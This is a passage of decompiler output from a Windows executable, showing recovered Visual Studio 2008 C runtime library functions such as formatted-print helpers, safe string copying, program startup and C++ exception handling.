    local_24._cnt = param_3 * 2;
  }
  else {
    local_24._cnt = 0x7fffffff;
  }
  iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
  if (param_2 == (char *)0x0) {
    return iVar2;
  }
  if (-1 < iVar2) {
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      iVar3 = __flsbuf(0,&local_24);
      if (iVar3 == -1) goto LAB_00415fa8;
    }
    else {
      *local_24._ptr = '\0';
      local_24._ptr = local_24._ptr + 1;
    }
    local_24._cnt = local_24._cnt + -1;
    if (-1 < local_24._cnt) {
      *local_24._ptr = '\0';
      return iVar2;
    }
    iVar3 = __flsbuf(0,&local_24);
    if (iVar3 != -1) {
      return iVar2;
    }
  }
LAB_00415fa8:
  *(undefined2 *)(param_2 + param_3 * 2 + -2) = 0;
  return (-1 < local_24._cnt) - 2;
}



// Library Function - Single Match
//  __vswprintf_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vswprintf_s_l(wchar_t *_DstBuf,size_t _DstSize,wchar_t *_Format,_locale_t _Locale,va_list _ArgList
               )

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (wchar_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (wchar_t *)0x0) || (_DstSize == 0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vswprintf_helper(FUN_0041e5e5,(char *)_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList
                                );
      if (iVar2 < 0) {
        *_DstBuf = L'\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vswprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _vswprintf_s(wchar_t *_Dst,size_t _SizeInWords,wchar_t *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vswprintf_s_l(_Dst,_SizeInWords,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  _strcat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        do {
          cVar1 = *_Src;
          *pcVar3 = cVar1;
          pcVar3 = pcVar3 + 1;
          _Src = _Src + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_00416086;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_00416086:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  __vsnprintf_helper
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (char *)0x0)) {
    local_24._cnt = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_24._cnt = param_3;
    }
    local_24._flag = 0x42;
    local_24._base = param_2;
    local_24._ptr = param_2;
    iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (char *)0x0) {
      if (-1 < iVar2) {
        local_24._cnt = local_24._cnt - 1;
        if (-1 < local_24._cnt) {
          *local_24._ptr = '\0';
          return iVar2;
        }
        iVar3 = __flsbuf(0,&local_24);
        if (iVar3 != -1) {
          return iVar2;
        }
      }
      param_2[param_3 - 1] = '\0';
      iVar2 = (-1 < local_24._cnt) - 2;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  return iVar2;
}



// Library Function - Single Match
//  __vsprintf_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vsnprintf_helper(__output_s_l,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
      if (iVar2 < 0) {
        *_DstBuf = '\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vsprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = vftable;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return this;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2008 Release

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



// Library Function - Single Match
//  _calloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _calloc(size_t _Count,size_t _Size)

{
  int *piVar1;
  int *piVar2;
  int local_8;
  
  local_8 = 0;
  piVar1 = __calloc_impl(_Count,_Size,&local_8);
  if ((piVar1 == (int *)0x0) && (local_8 != 0)) {
    piVar2 = __errno();
    if (piVar2 != (int *)0x0) {
      piVar2 = __errno();
      *piVar2 = local_8;
    }
  }
  return piVar1;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_00435f78 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0041636a)
// Library Function - Single Match
//  ___tmainCRTStartup
// 
// Library: Visual Studio 2008 Release

int ___tmainCRTStartup(void)

{
  int iVar1;
  short *psVar2;
  _STARTUPINFOW local_6c;
  int local_24;
  int local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x41630f;
  local_8 = 0;
  GetStartupInfoW(&local_6c);
  local_8 = 0xfffffffe;
  local_20 = 0;
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    _fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    _fast_error_exit(0x10);
  }
  __RTC_Initialize();
  local_8 = 1;
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_00438ebc = GetCommandLineW();
  DAT_00435f74 = ___crtGetEnvironmentStringsW();
  iVar1 = __wsetargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __wsetenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  psVar2 = (short *)__wwincmdln();
  local_24 = FUN_00404c70((HINSTANCE)&IMAGE_DOS_HEADER_00400000,0,psVar2);
  if (local_20 == 0) {
                    // WARNING: Subroutine does not return
    _exit(local_24);
  }
  __cexit();
  return local_24;
}



void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



// Library Function - Single Match
//  void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
                    // WARNING: Load size is inaccurate
  ExceptionList = *ExceptionList;
                    // WARNING: Could not recover jumptable at 0x004164b5. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)param_1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  void __stdcall _CallMemberFunction1(void *,void *,void *)
//  void __stdcall _CallMemberFunction2(void *,void *,void *,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x004164c1. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
// 
// Library: Visual Studio 2008 Release

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  void *pvVar1;
  
  pvVar1 = ExceptionList;
  RtlUnwind(param_1,(PVOID)0x4164ee,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *(void **)pvVar1 = ExceptionList;
  ExceptionList = pvVar1;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___CxxFrameHandler
//  ___CxxFrameHandler2
//  ___CxxFrameHandler3
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  _s_FuncInfo *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,'\0');
  return uVar1;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl CatchGuardHandler(struct EHExceptionRecord *,struct
// CatchGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
CatchGuardHandler(EHExceptionRecord *param_1,CatchGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  _Var1 = ___InternalCxxFrameHandler
                    ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,
                     (void *)0x0,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
                     (EHRegistrationNode *)param_2,'\0');
  return _Var1;
}



// Library Function - Single Match
//  int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
// *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x41662b;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_00432c20 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)ExceptionList;
    ExceptionList = &local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 != 0) {
                    // WARNING: Load size is inaccurate
      *local_2c = *ExceptionList;
    }
    ExceptionList = local_2c;
  }
  return local_3c;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
// TranslatorGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  code *local_8;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0
             ,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),'\x01');
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    // WARNING: Could not recover jumptable at 0x004166ee. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = (*local_8)();
  return _Var1;
}



// Library Function - Single Match
//  struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
// *,int,int,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2008 Release

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck(_s_FuncInfo *param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  TryBlockMapEntry *pTVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
  pTVar1 = param_1->pTryBlockMap;
  uVar5 = param_1->nTryBlocks;
  uVar2 = uVar5;
  uVar3 = uVar5;
  while (uVar4 = uVar2, -1 < param_2) {
    if (uVar5 == 0xffffffff) {
      _inconsistency();
    }
    uVar5 = uVar5 - 1;
    if (((pTVar1[uVar5].tryHigh < param_3) && (param_3 <= pTVar1[uVar5].catchHigh)) ||
       (uVar2 = uVar4, uVar5 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar5;
      uVar3 = uVar4;
    }
  }
  uVar5 = uVar5 + 1;
  *param_4 = uVar5;
  *param_5 = uVar3;
  if ((param_1->nTryBlocks < uVar3) || (uVar3 < uVar5)) {
    _inconsistency();
  }
  return pTVar1 + uVar5;
}



// Library Function - Single Match
//  __CreateFrameInfo
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



// Library Function - Single Match
//  __IsExceptionObjectToBeDestroyed
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



// Library Function - Single Match
//  __FindAndUnlinkFrame
// 
// Library: Visual Studio 2008 Release

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
  }
  else {
    p_Var2 = __getptd();
    pvVar1 = p_Var2->_pFrameInfoChain;
    do {
      pvVar3 = pvVar1;
      if (*(int *)((int)pvVar3 + 4) == 0) {
        _inconsistency();
        return;
      }
      pvVar1 = *(void **)((int)pvVar3 + 4);
    } while (param_1 != *(void **)((int)pvVar3 + 4));
    *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  }
  return;
}



// Library Function - Single Match
//  void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
// *,int,unsigned long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                ulong param_5)

{
  void *pvVar1;
  void *local_1c;
  code *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_00432c20 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = CatchGuardHandler;
  local_c = param_1;
  local_1c = ExceptionList;
  ExceptionList = &local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  ExceptionList = local_1c;
  return pvVar1;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00432c20 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00432c20 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_GS
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_GS(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00432c20 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch_GS
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void __cdecl __EH_prolog3_catch_GS(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00432c20 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __EH_epilog3
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __EH_epilog3(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-3];
  *unaff_EBP = unaff_retaddr;
  return;
}



// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

void FUN_0041695c(void)

{
  uint unaff_EBP;
  
  ___security_check_cookie_4(*(uint *)(unaff_EBP - 0x10) ^ unaff_EBP);
  return;
}



// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

void FUN_0041696b(void)

{
  uint unaff_EBP;
  
  ___security_check_cookie_4(*(uint *)(unaff_EBP - 0x14) ^ unaff_EBP);
  return;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0042accc;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  _wcsncpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcsncpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src,rsize_t _MaxCount)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  rsize_t rVar4;
  errno_t eVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (wchar_t *)0x0) {
      if (_SizeInWords == 0) {
        return 0;
      }
    }
    else {
LAB_004169ec:
      if (_SizeInWords != 0) {
        if (_MaxCount == 0) {
          *_Dst = L'\0';
          return 0;
        }
        if (_Src != (wchar_t *)0x0) {
          pwVar3 = _Dst;
          rVar4 = _SizeInWords;
          if (_MaxCount == 0xffffffff) {
            do {
              wVar1 = *_Src;
              *pwVar3 = wVar1;
              pwVar3 = pwVar3 + 1;
              _Src = _Src + 1;
              if (wVar1 == L'\0') break;
              rVar4 = rVar4 - 1;
            } while (rVar4 != 0);
          }
          else {
            do {
              wVar1 = *_Src;
              *pwVar3 = wVar1;
              pwVar3 = pwVar3 + 1;
              _Src = _Src + 1;
              if ((wVar1 == L'\0') || (rVar4 = rVar4 - 1, rVar4 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pwVar3 = L'\0';
            }
          }
          if (rVar4 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInWords - 1] = L'\0';
            return 0x50;
          }
          *_Dst = L'\0';
          piVar2 = __errno();
          eVar5 = 0x22;
          *piVar2 = 0x22;
          goto LAB_004169fd;
        }
        *_Dst = L'\0';
      }
    }
  }
  else if (_Dst != (wchar_t *)0x0) goto LAB_004169ec;
  piVar2 = __errno();
  eVar5 = 0x16;
  *piVar2 = 0x16;
LAB_004169fd:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar5;
}



// Library Function - Single Match
//  __purecall
// 
// Library: Visual Studio 2008 Release

void __purecall(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)__decode_pointer(DAT_004369d8);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  __NMSG_WRITE(0x19);
  __set_abort_behavior(0,1);
                    // WARNING: Subroutine does not return
  _abort();
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __onexit_nolock(int param_1)

{
  int *_Memory;
  int *piVar1;
  size_t sVar2;
  size_t sVar3;
  void *pvVar4;
  int iVar5;
  
  _Memory = (int *)__decode_pointer(DAT_00438eb0);
  piVar1 = (int *)__decode_pointer(DAT_00438eac);
  if ((piVar1 < _Memory) || (iVar5 = (int)piVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return 0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return 0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return 0;
      }
    }
    piVar1 = (int *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_00438eb0 = __encode_pointer((int)pvVar4);
  }
  iVar5 = __encode_pointer(param_1);
  *piVar1 = iVar5;
  DAT_00438eac = __encode_pointer((int)(piVar1 + 1));
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2008 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_00418dff();
  p_Var1 = (_onexit_t)__onexit_nolock((int)_Func);
  FUN_00416be4();
  return p_Var1;
}



void FUN_00416be4(void)

{
  FUN_00418e08();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
